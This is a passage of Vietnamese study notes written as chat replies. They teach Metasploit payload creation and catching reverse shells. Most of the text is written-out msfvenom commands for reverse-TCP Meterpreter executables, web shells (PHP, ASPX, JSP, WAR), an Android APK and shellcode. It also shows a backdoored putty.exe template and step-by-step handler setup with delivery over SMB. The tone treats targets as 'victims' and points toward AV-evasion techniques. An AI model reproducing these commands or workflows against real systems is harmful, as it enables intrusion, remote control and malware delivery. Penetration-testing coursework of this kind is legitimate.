- `/` = **staged** → `windows/x64/meterpreter/reverse_tcp`  
- `_` = **stageless** → `windows/x64/meterpreter_reverse_tcp`

### 🎯 Khi nào chọn loại nào:
- **Stageless**: khi tạo file standalone bằng msfvenom (đem đi USB, upload, SSH...). Vì cần tự chứa hết, không phụ thuộc mạng.
- **Staged**: khi dùng msfconsole exploit vì module tự lo staging; hoặc khi cần file nhỏ (buffer overflow, SQLi giới hạn shellcode).

### 🧪 Tạo bằng msfvenom:

**Staged:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o staged.exe
```

**Stageless:**
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f exe -o stageless.exe
```
So sánh kích thước: staged ~7 KB (stager nhỏ), stageless ~250 KB (đầy đủ).

### 📌 Handler behavior:
- Với **staged**, handler phải bật sẵn để khi stager gọi về, nó serve stage ngay. Nếu không khớp payload type hay không mở port đúng, connection fail.
- Với **stageless**, handler chỉ cần nhận kết nối, không cần serve gì thêm.

➡️ **Tóm gọn:**  
- **Stageless** = "một cục" → tự chạy, đáng tin, dùng cho file thủ công.  
- **Staged** = "hai phần" → nhỏ nhẹ, cần handler hỗ trợ tải, thường do exploit tự lo.

Hỏi tiếp đi! 😎

</div>

---

<div id="doc-fb841c2d1f74b56a3a48fba62ddf7d11405d3693" class="notion-callout-card">

Handler là **cái "tổng đài" mày mở trên máy mình để chờ nạn nhân gọi về**.

Khi payload chạy trên máy nạn nhân, nó sẽ kết nối ngược về địa chỉ IP:port mà mày đã ghi trong payload (LHOST, LPORT). Lúc đó cần có một thằng đứng nghe ở cổng đó để bắt máy, tạo phiên (session) cho mày điều khiển. Thằng đó gọi là **handler**.

Trong Metasploit, handler là module `exploit/multi/handler`. Mày cấu hình nó khớp với payload đã tạo (cùng payload type, cùng LHOST, LPORT) rồi chạy nó để lắng nghe.

Ví dụ:
1. Mày tạo file payload bằng `msfvenom` với `LHOST=10.10.14.12`, `LPORT=4444`.
2. Mở `msfconsole`, dùng:
   ```
   use exploit/multi/handler
   set payload windows/x64/meterpreter/reverse_tcp
   set LHOST 10.10.14.12
   set LPORT 4444
   run
   ```
3. Khi nạn nhân chạy file payload, nó gọi về `10.10.14.12:4444`, handler bắt và mở session.

Nếu payload là **staged**, handler còn phải gửi thêm stage cho nó tải về. Còn **stageless** thì chỉ cần nhận kết nối là xong.

Tóm lại: handler = thằng đứng đợi máy nạn nhân gọi về để mở cửa cho mày vào. Không có nó thì payload chạy cũng như gọi vào máy không ai bắt. 😎

</div>

---

<div id="doc-cc2b6d1632783b97b2b0fbf07bdc27a8e0bd0992" class="notion-callout-card">

Ok mày, tao giải thích ngắn gọn phần này:

### 📘 Hai loại định dạng output của msfvenom:
- **Executable formats** – tạo ra file nhị phân chạy trực tiếp trên OS mục tiêu.  
  Ví dụ: `exe` (Windows), `elf` (Linux), `macho` (macOS), `msi` (Windows Installer), `apk` (Android), `war` (Java web app).  
  → Dùng khi mày cần **thả file vào máy nạn nhân và bắt nó chạy**.

- **Transform formats** – tạo ra mã nguồn hoặc dữ liệu thô để **nhúng vào tool/script khác**.  
  Ví dụ: `raw` (bytes thô), `c` (mảng C), `csharp` (mảng C#), `python` (chuỗi Python), `powershell` (mã PowerShell), `hex` (chuỗi hex), `base64`.  
  → Dùng khi mày **tự build exploit**, nhúng shellcode vào loader, hoặc chạy lệnh qua injection mà không cần ghi file.

### 🎯 Nguyên tắc chọn:
- Cần **file chạy được** → dùng executable format.  
- Cần **dữ liệu để nhúng** → dùng transform format.

### 🧪 Các "công thức" payload thường gặp:

| Kịch bản | Payload | Định dạng | Ghi chú |
|----------|---------|-----------|---------|
| Windows file `.exe` | `windows/x64/meterpreter_reverse_tcp` | `-f exe` | Stageless cho file standalone. Nạn nhân chạy file → gọi về handler. |
| Linux file `.elf` | `linux/x64/meterpreter_reverse_tcp` | `-f elf` | Chuyển qua SSH/SCP, xong `chmod +x shell.elf` rồi `./shell.elf`. |
| PHP web shell | `php/meterpreter_reverse_tcp` | `-f raw` | Upload lên web PHP, truy cập URL để kích hoạt. Nhớ sửa tag `<?php` nếu bị comment. |
| Python one-liner | `cmd/unix/reverse_python` | `-f raw` | Không cần ghi file, dán thẳng vào terminal nạn nhân. |
| Raw shellcode C | `windows/x64/meterpreter_reverse_tcp` | `-f c` | Dùng để nhúng vào exploit tự viết. Xuất mảng byte C. |

### 💡 Ví dụ nhanh:
```bash
# Tạo file .exe cho Windows
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Tạo file .elf cho Linux
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# Tạo PHP web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

# Tạo Python one-liner (in ra terminal)
msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=4444 -f raw

# Tạo raw shellcode dạng C
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f c
```

➡️ **Tóm gọn:** Chọn `-f` theo nhu cầu: file chạy (`exe`, `elf`, `apk`...) hoặc mã để nhúng (`raw`, `c`, `python`, `powershell`...). Với file standalone thì nên dùng **stageless** (`_`) cho đáng tin.

Cần ví dụ thêm hay đào sâu chỗ nào thì hỏi nhé! 😎

</div>

---

<div id="doc-da8c957a70ada879181eb0ad9b579bd1ec845a7e" class="notion-callout-card">

Ok mày, nghe tao giải thích về **encoding** trong msfvenom nhé.

### 📘 Encoding thực chất làm gì?
- Encoder biến đổi dãy byte của payload sang một dạng khác, thường dùng **XOR** với key thay đổi, kèm một **decoder stub** nhỏ ở đầu.
- Khi payload chạy, decoder stub thực thi trước, giải mã payload về dạng gốc trong bộ nhớ, rồi mới chạy tiếp.

### 🎯 Mục đích chính của encoding:
- **Loại bỏ ký tự xấu (bad characters)**: Một số kênh khai thác (ví dụ buffer overflow qua hàm copy chuỗi) không chịu được byte null `\x00`, xuống dòng `\x0a`... Encoding giúp payload tránh mấy byte đó.
- **Tuân thủ định dạng**: Có nơi chỉ cho phép ký tự ASCII in được, encoding giúp payload nằm trong giới hạn đó.

### 🧪 Dùng encoder với msfvenom:
- `-e` (encoder) – chọn encoder, ví dụ `-e x86/shikata_ga_nai`
- `-i` (iterations) – số lần lặp encode, ví dụ `-i 3`
- `-b` (bad chars) – liệt kê ký tự cần tránh, ví dụ `-b '\x00\x0a\x0d'`

**Ví dụ:**
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f exe -e x86/shikata_ga_nai -i 3 -o encoded.exe
```

Khi dùng `-b` mà không chỉ định `-e`, msfvenom tự chọn encoder phù hợp.

### ❌ Vì sao encoding không bypass được antivirus hiện đại?
Ngày xưa AV chỉ quét **chữ ký tĩnh** (so byte với database). Encoding làm thay đổi byte nên qua mặt được. Nhưng giờ AV có:
- **Heuristic analysis**: nhìn hành vi code, thấy decoder stub giải mã rồi chạy code trong memory là báo động.
- **Sandboxing**: cho file chạy trong môi trường cô lập để quan sát, payload tự lộ.
- **AMSI**: trên Windows, can thiệp lúc script/payload giải mã xong trước khi thực thi.
- **Machine learning**: học từ hàng triệu mẫu, nhận ra mẫu độc dù có biến đổi.

➡️ Vì vậy, chạy `shikata_ga_nai` 10 vòng với payload Meterpreter mặc định vẫn bị tóm ngay. Bản thân cái decoder stub đã là signature nổi tiếng rồi.

### ✅ Khi nào encoding vẫn có ích?
- **Trong phát triển exploit**: khi cần tránh bad chars do giới hạn kỹ thuật (buffer overflow). Đây là nhu cầu kỹ thuật thật sự, không phải để trốn tránh.
- Muốn bypass thật sự thì phải dùng kỹ thuật nâng cao ngoài msfvenom: custom loader, process injection, AMSI bypass, obfuscation... Mấy đó thuộc module nâng cao hơn.

Tóm gọn: **encoding chỉ để xử lý kỹ thuật (bad chars), không phải để trốn AV**. Đừng ảo tưởng nhé! 😎

</div>

---

<div id="doc-bb1992cd46195f350c21bc14bc0e9c11a8bbe0c5" class="notion-callout-card">

Ok mày, tao giải thích phần này ngắn gọn:

### 📘 Chèn payload vào file có sẵn (Template Injection)

Dùng cờ `-x` (template) để lấy một file thực thi hợp pháp làm "vỏ bọc", rồi chèn payload vào trong đó.

**Ví dụ:**
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -x /root/templates/putty.exe -f exe -o putty_backdoor.exe
```
- Tạo ra file `putty_backdoor.exe` nhìn giống PuTTY thật.
- Khi nạn nhân chạy, payload âm thầm kết nối về máy mày, còn app gốc có thể vẫn hoạt động (nếu dùng thêm `-k`).

**Cờ `-k` (keep)**: giữ nguyên chức năng của file gốc, payload chạy song song trong thread riêng.

**Nhược điểm:**
- Hash file thay đổi → hệ thống kiểm tra toàn vẹn sẽ phát hiện.
- Chữ ký số gốc bị hỏng → Windows cảnh báo "publisher could not be verified".
- AV hiện đại soi mẫu file lành tính nhưng có code lạ → dễ bị bắt.

➡️ Chủ yếu dùng trong lab/CTF, thực chiến cần thêm kỹ thuật che giấu.

---

### 📘 Tạo payload đa nền tảng

| Nền tảng | Định dạng | Ví dụ lệnh | Ghi chú |
|----------|-----------|------------|---------|
| Android | `apk` | `msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o evil.apk` | Không cần `-f`, máy cần bật cài đặt từ nguồn lạ. |
| macOS | `macho` | `msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f macho -o shell.macho` | Định dạng Mach-O. |
| Java (Tomcat...) | `war` | `msfvenom -p java/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war` | Triển khai qua Tomcat Manager hoặc upload. |
| IIS (.NET) | `aspx` | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f aspx -o shell.aspx` | Upload lên IIS, truy cập URL để chạy. |
| Java web | `jsp` | `msfvenom -p java/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f jsp -o shell.jsp` | Giống PHP nhưng cho server Java. |

---

### 🎯 Nguyên tắc chọn:
1. **OS mục tiêu** → xác định nền tảng payload (`windows`, `linux`, `android`, `java`, `php`...).
2. **Cách giao payload** → chọn format: file nhị phân (`exe`, `elf`, `apk`...), web upload (`php`, `aspx`, `jsp`, `war`...), nhúng code (`raw`, `c`, `python`...).
3. **Môi trường chạy** → nếu có PHP thì dùng PHP, có Java thì dùng WAR/JSP, còn bare OS thì dùng binary.

➡️ Cứ theo cây quyết định đó là chọn đúng.

</div>

---

<div id="doc-2a6d5f4c235fdf6d6a834734125086534dd65495" class="notion-callout-card">

Ok mày, phần này dạy cách **bắt kết nối ngược** từ payload đã tạo bằng `msfvenom`. Thằng bắt gọi là **handler** – dùng module `exploit/multi/handler`.

### 📘 Handler là gì?
- Là **listener** chạy trên máy mày, mở cổng (LPORT) chờ payload từ máy nạn nhân gọi về.
- Khi payload chạy, nó kết nối tới `LHOST:LPORT` mà mày đã ghi lúc tạo payload. Handler nhận kết nối và tạo **session** cho mày điều khiển.

### 🔧 Cấu hình handler trong msfconsole:
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST <IP_của_mày>
set LPORT <cổng>
show options
run
```
- `set PAYLOAD` phải **giống hệt** payload đã tạo (kể cả `/` hay `_`).
- `set LHOST` và `set LPORT` phải trùng với lúc tạo payload.
- `show options` để kiểm tra trước khi chạy.

### ⚠️ Quy tắc vàng: Mọi thứ phải khớp
Ba giá trị bắt buộc phải trùng:
1. **Payload type** – `windows/x64/meterpreter_reverse_tcp` (stageless) khác `windows/x64/meterpreter/reverse_tcp` (staged).
2. **LHOST** – IP máy mày.
3. **LPORT** – cổng nhận kết nối.

Nếu sai một trong ba, payload gọi về nhưng handler không hiểu → **fail im lặng**, không báo lỗi.

### 🔁 Quy trình đầy đủ (Generate → Deliver → Catch)

**Bước 1: Tạo payload**
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f exe -o shell.exe
```

**Bước 2: Mở handler (trong msfconsole)**
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 10.10.14.12
set LPORT 4444
run
```

**Bước 3: Đưa payload lên mục tiêu** – bằng SMB upload, SSH, hoặc cách khác.
Ví dụ dùng module `auxiliary/admin/smb/upload_file` để upload `shell.exe` lên share.

**Bước 4: Thực thi payload trên mục tiêu** – chạy file đó (ví dụ `shell.exe`).

**Bước 5: Bắt session** – handler nhận kết nối, hiện:
```
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> MACHINE_IP:55320)
meterpreter >
```
Sau đó dùng `sysinfo` để kiểm tra.

### 🛠️ Mẹo hữu ích:
- **Chạy handler nền**: `run -j` – handler chạy background job, mày làm việc khác được. Khi có session, dùng `sessions -i <id>` để vào.
- **Bắt nhiều session**: `set ExitOnSession false` – handler không tắt sau session đầu, bắt được nhiều máy.
- **Tự động chạy script khi có session**: `set AutoRunScript post/windows/manage/migrate` – tự migrate process ngay sau khi session mở.

➡️ **Tóm gọn:** Muốn bắt reverse shell từ payload tạo tay, mày phải mở `exploit/multi/handler`, set đúng `PAYLOAD`, `LHOST`, `LPORT`, rồi `run`. Nhớ quy tắc vàng: mọi thứ phải khớp chính xác.

Cần sâu hơn chỗ nào thì hỏi tiếp! 😎

</div>

---

